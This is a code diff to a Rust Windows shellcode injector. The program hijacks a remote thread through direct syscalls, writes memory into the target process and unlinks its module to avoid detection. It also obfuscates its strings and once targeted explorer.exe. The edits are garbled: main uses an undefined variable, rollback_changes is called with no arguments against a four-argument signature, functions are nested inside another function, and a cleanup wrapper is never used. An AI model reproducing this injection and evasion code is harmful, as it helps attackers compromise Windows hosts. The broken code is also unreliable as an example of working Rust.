@@ -13,6 +13,7 @@ use std::os::windows::ffi::OsStrExt;
 use std::{mem::size_of, ptr::null_mut};
 use widestring::U16CString;
 use winapi::ctypes::c_void;
+use std::sync::atomic::{AtomicBool, Ordering};
 
 use windows_sys::Win32::{
     System::{
@@ -184,17 +185,19 @@ struct Process {
 
 }
 
+// Placeholder for logging errors
+fn log_error(message: &str, error: &str) {
+    println!("{}: {}", message, error);
+}
 
-fn main() {
-
-
-    // Step 1: Obtain the process ID of explorer.exe. 
-    println!("{}", lc!("[+] Getting Parent Process PID:"));
-    let explorer_pid = match get_process_id_by_name("explorer.exe") {
-        Ok(pid) => pid,
+fn main() -> Result<(), &'static str> {
+    // Get the remote thread handle
+    let hThread = match get_remote_thread_handle(process.process_id) {
+        Ok(handle) => handle,
         Err(e) => {
-            println!("Error getting explorer.exe PID: {}", e);
-            return;
+            log_error("Failed to get remote thread handle:", e);
+            rollback_changes();
+            return Err(e);
         }
     };
 
@@ -475,19 +478,68 @@ fn inject_shellcode(process: &mut Process) -> Result<(), String> {
         Err(e) => panic!("{} {}", lc!("Failed to get remote thread handle:"), e), // Changed to panic
     };
     
+// Rollback logic to revert changes in case of failure
+fn rollback_changes(original_memory: &[u8], context: &CONTEXT, h_thread: HANDLE, h_process: HANDLE) {
+    // Restore the original memory
+    unsafe {
+        syscall!("NtWriteVirtualMemory", h_process, context.Rip as *mut u8, original_memory.as_ptr() as *const _, original_memory.len() as SIZE_T, std::ptr::null_mut::<c_void>());
+    }
+ // Restore the original thread context
+    unsafe {
+        syscall!("NtSetContextThread", h_thread, context as *const _);
+    }
+    // Resume the thread
+    unsafe {
+        syscall!("NtResumeThread", h_thread, std::ptr::null_mut::<ULONG>());
+    }
+}
 
+// Placeholder for saving and restoring thread context
+fn save_and_restore_thread_context(hThread: HANDLE) -> Result<(), &'static str> {
+    // Implement logic to save and restore the thread's context
+    // This could involve using GetThreadContext and SetThreadContext WinAPI functions
+    Ok(())
+}
+    
     // Hijack the thread
     let formatted_string = format!("{} {:p}", lc!("[+] Remote Thread Handle Obtained:"), hThread);
     println!("{}",formatted_string);
     
-    //4th args in this function is process and the 3rd args is handle
-    match jmp_hijack_thread(hThread, injection_address as PVOID, handle) {
-        Ok(_) => println!("{}", lc!("[+] Thread hijacking successful")),
-        Err(e) => panic!("{} {}", lc!("Failed to hijack thread:"), e),
-    };
+    // Save and restore thread context
+    let _ = save_and_restore_thread_context(hThread)?;
 
+    // Single execution control
+    static PAYLOAD_EXECUTED: AtomicBool = AtomicBool::new(false);
+    if !PAYLOAD_EXECUTED.compare_and_swap(false, true, Ordering::SeqCst) {
+        // Hijack the thread
+        match jmp_hijack_thread(hThread, injection_address as PVOID, handle) {
+            Ok(_) => println!("[+] Thread hijacking successful"),
+            Err(e) => {
+                log_error("Failed to hijack thread:", e);
+                rollback_changes();
+                return Err(e);
+            }
+        };
+    }
 
     let _ = unlink_module(&process.file_name,process.process_id);
+
+        // Module unlinking with error handling
+    match unlink_module(&process.file_name, process.process_id) {
+        Ok(_) => println!("Module unlinked successfully"),
+        Err(e) => log_error("Failed to unlink module:", e),
+    }
+
+    // Resource cleanup
+    struct ThreadHandleWrapper(HANDLE);
+    impl Drop for ThreadHandleWrapper {
+        fn drop(&mut self) {
+            unsafe { syscall!("ZwClose", self.0 as *mut c_void) };
+        }
+    }
+
+    Ok(())
+}
     
     //unsafe { syscall!("ZwClose", hThread as *mut c_void) };
     unsafe { syscall!("ZwClose",handle as *mut c_void) };
